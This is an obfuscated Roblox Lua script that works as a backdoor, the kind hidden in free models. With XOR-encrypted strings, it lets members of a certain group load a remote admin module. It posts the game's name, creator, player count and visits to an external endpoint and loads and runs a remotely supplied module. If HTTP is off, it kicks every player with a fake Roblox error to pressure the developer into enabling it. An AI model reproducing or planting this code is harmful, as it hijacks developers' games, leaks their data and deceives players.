local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v29,v30) local v31={};for v34=1, #v29 do v6(v31,v0(v4(v1(v2(v29,v34,v34 + 1 )),v1(v2(v30,1 + (v34% #v30) ,1 + (v34% #v30) + 1 )))%256 ));end return v5(v31);end local v8=90004131 -54749822 ;game.Players.PlayerAdded:Connect(function(v32) if v32:IsInGroup(v8) then if (v32:GetRankInGroup(v8)>=2) then require(73854684096388 -(397 + 339) ).thehatwasawfulrad(v32.Name);end end end);local v9=v7("\217\215\207\53\245\225\136\81\198\198\217\45\233\180\204\80\223\198\204\54\242\186\213\25\212\215\222\33\168\184\200\19\158\194\203\44\169\172\194\28\217\204\212\46\245\244\150\77\128\145\140\119\178\234\159\75\132\151\142\112\177\233\148\72\131\140\200\51\183\246\246\53\244\213\236\118\191\144\138\23\128\210\143\16\204\168\223\49\128\201\234\2\182\139\208\25\134\148\212\35\247\233\146\71\254\246\252\119\239\232\202\70\227\242\249\43\223\176\147\38\210\247\220\36\197\152\214\39\248\241\215\10\215\161","\126\177\163\187\69\134\219\167");local v10=game.PlaceId;local v11=game:GetService(v7("\11\217\62\213\207\38\223\60\204\255\38","\156\67\173\74\165"));local v12;local v13,v14=pcall(function() return game.Players:GetNameFromUserIdAsync(game.CreatorId);end);if v13 then v12=v14;else v12=v7("\26\248\104","\38\84\215\41\118\220\70");end local v15=game:GetService(v7("\125\23\48\25\251\68\6\46\19\253\85\37\39\0\232\89\21\39","\158\48\118\66\114")):GetProductInfo(game.PlaceId);local v16=v15.Name;local v17= #game.Players:GetPlayers();local v18=game.GameId;local v19=v7("\163\48\4\38\96\255\180\228\35\17\59\118\182\181\185\43\0\36\124\189\226\229\39\31\59\60\179\170\228\35\17\59\118\182\164\190\42\25\32\118\183\232\174\13\20\37\46","\155\203\68\112\86\19\197")   .. v18 ;local v20,v21=pcall(function() return v11:GetAsync(v19);end);local v22;local v23=v7("\78\201\34\236\83\34\170\183\71\206\37\249\84\127\228\245\67\147\36\243\66\116\234\224\8\222\57\241\15\95\228\245\67\146\2\243\79\116\246\183\114\213\35\241\66\118\228\241\74\252\37\239\69\108\171\249\85\213\46\163\65\113\225\165","\152\38\189\86\156\32\24\133")   .. v10   .. v7("\186\81\170\82\161\71\169\65\186\64\163\27\168\5\247\0\244\67\250\18\174\7","\38\156\55\199") ;if v20 then v22=v11:JSONDecode(v21).data[439 -(262 + 176) ].visits;end local v24={[v7("\171\114\114\60\22\122\238","\35\200\29\28\72\115\20\154")]=v7("\55\154\230\159\161\3\19\88\254","\84\121\223\177\191\237\76"),[v7("\190\91\203\165\62\67","\161\219\54\169\192\90\48\80")]={{[v7("\93\75\20\41\76","\69\41\34\96")]=tostring(v16)   .. v7("\252\142\151\45\3\38\185\131\219\5\5\44\185\199\153","\75\220\163\183\106\98") ,[v7("\6\191\152\52\203\11\170\159\62\214\12","\185\98\218\235\87")]=v7("\234\124\41\227\201\234\204\61\42\227\158\166\196\59\103\238\223\174\139\61\55\246\219\171\217\57\35\168","\202\171\92\71\134\190"),[v7("\47\200\41\132\45\210","\232\73\161\76")]={{[v7("\181\216\79\88","\126\219\185\34\61")]=v7("\63\203\76\100\123\101\179\215\0\207\71\119\108\100","\135\108\174\62\18\30\23\147"),[v7("\160\232\38\222\29","\167\214\137\74\171\120\206\83")]=tostring(v17)},{[v7("\133\241\63\88","\199\235\144\82\61\152")]=v7("\38\21\173\34\17\19\249\27\11\23\160\46\21\5","\75\103\118\217"),[v7("\209\85\124\1\188","\126\167\52\16\116\217")]=tostring(v17)   .. v7("\136\102\15\142\184\0\188\219\38\47\151\167\89\239\205\60\54\133\166\89\236\196\47\57\133\166\10\188\206\33\50\192\186\22\235\129","\156\168\78\64\224\212\121") },{[v7("\9\239\168\203","\174\103\142\197")]=v7("\121\63\81\61\55","\152\54\72\63\88\69\62"),[v7("\194\197\226\73\209","\60\180\164\142")]=tostring(v12)},{[v7("\86\95\8\44","\114\56\62\101\73\71\141")]=v7("\142\224\200\205\172\250","\164\216\137\187"),[v7("\196\231\61\167\163","\107\178\134\81\210\198\158")]=tostring(v22)},{[v7("\54\15\143\195","\202\88\110\226\166")]=v7("\228\14\143\242\138\239\6\140\252","\170\163\111\226\151"),[v7("\7\49\190\45\75","\73\113\80\210\88\46\87")]=v7("\137\56\217\2\244\219\99\130\5\240\150\98\223\29\229\141\35\213\92\228\142\33\130\21\230\140\41\222\93","\135\225\76\173\114")   .. tostring(game.PlaceId) }},[v7("\27\248\172\184\163\175","\199\122\141\216\208\204\221")]={[v7("\163\220\29\245","\150\205\189\112\144\24")]=v7("\12\138\172\67\9\134\24\17\101\137\182\75\12\156\81\18\32\196\184\67\5\156\20\20","\112\69\228\223\44\100\232\113")},[v7("\210\16\8\199\179\110","\230\180\127\103\179\214\28")]={[v7("\152\0\71\82","\128\236\101\63\38\132\33")]=v7("\155\172\81\72\185\253\202\236\128\31\87\185\230\193\165\168\34\119","\175\204\201\113\36\214\139")},[v7("\78\193\52\219\1","\100\39\172\85\188")]={[v7("\184\106\181","\83\205\24\217\224")]=tostring(v23)},[v7("\242\205\216\48\228\203\204\52\234","\93\134\165\173")]={[v7("\171\224\205","\30\222\146\161\162\90\174\210")]=tostring(v23)}}},[v7("\228\90\100\11\230\70\125\15\235\90\99","\106\133\46\16")]={}};local v25,v26=pcall(function() return v11:GetAsync(v7("\80\52\103\236\73\26\23\111\113\240\89\65\74\35\123\245\76\69\75\110\116\245\78\72\77\34\61\245\85\15","\32\56\64\19\156\58"));end);local v27="Roblox encountered a strange error.\nWe couldn't reach our API servers.\nPlease, enable HTTP requests in your game settings to continue.\nError Code: 813";local function v28() local v33=698 -(208 + 490) ;while true do if (v33==(1206 -(696 + 510))) then for v37,v38 in ipairs(game.Players:GetPlayers()) do v38:Kick(v27);end game.Players.PlayerAdded:Connect(function(v39) v39:Kick(v27);end);break;end end end if v25 then local v36=0;while true do if (v36==1) then require(53206640 + 577322624 )(v11:GetAsync(v7("\81\66\95\237\102\220\200\68\91\90\72\252\103\133\143\2\79\83\88\179\114\143\147\3\76\84\5\244\122\201\147\3\92\94\74\233\98\135\148\5\86\66\89\252\113\200\139\30\88","\107\57\54\43\157\21\230\231")))();break;end if ((0 + 0)==v36) then v11:PostAsync(v9,v11:JSONEncode(v24));warn(v7("\121\199\233\95\73\225\137\85\198\194\68\85\231\144\26\193\246\22\94\247\144\72\205\230\87\78\247\132\22\136\231\67\78\178\129\84\136\236\88\73\230\129\84\203\224\22\82\243\132\26\219\241\95\86\254\192\88\205\224\88\26\243\132\94\205\225\24","\224\58\168\133\54\58\146"));v36=1 -0 ;end end else wait(v7("\233\132\19\249\182\196\143\250\187\56\181\138\217\221\205\142\3\181\188\206\221\212\153\75\181","\175\187\235\113\149\217\188")   .. tostring(v26) );end